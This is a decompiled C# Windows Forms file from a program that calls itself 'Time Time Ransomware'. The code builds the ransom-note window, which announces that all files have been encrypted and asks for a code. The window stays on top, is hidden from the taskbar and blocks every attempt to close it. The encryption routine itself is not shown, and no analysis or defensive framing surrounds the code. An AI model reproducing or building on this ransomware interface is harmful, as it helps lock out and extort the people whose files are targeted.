using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace TimeTime;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private TextBox textBox1;

	private Button button1;

	private Label label3;

	private Button button2;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		((Control)new EncrFiles()).Show();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_021b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Expected O, but got Unknown
		//IL_02ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b7: Expected O, but got Unknown
		//IL_0344: Unknown result type (might be due to invalid IL or missing references)
		//IL_034e: Expected O, but got Unknown
		//IL_04cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d7: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label2 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		label3 = new Label();
		button2 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(98, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(465, 31));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("All of your files have been encrypted !");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(12, 84));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(545, 96));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((Control)textBox1).set_BackColor(Color.FromArgb(32, 32, 32));
		((Control)textBox1).set_Font(new Font("Segoe UI", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(27, 246));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(331, 43));
		((Control)textBox1).set_TabIndex(2);
		((ButtonBase)button1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new Point(380, 246));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(243, 43));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("Check if the code is valid");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(452, 340));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(217, 24));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("Time Time Ransomware");
		((ButtonBase)button2).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_Location(new Point(16, 318));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(243, 43));
		((Control)button2).set_TabIndex(5);
		((Control)button2).set_Text("See encrypted files");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(32, 32, 32));
		((Form)this).set_ClientSize(new Size(681, 373));
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Cryptor");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
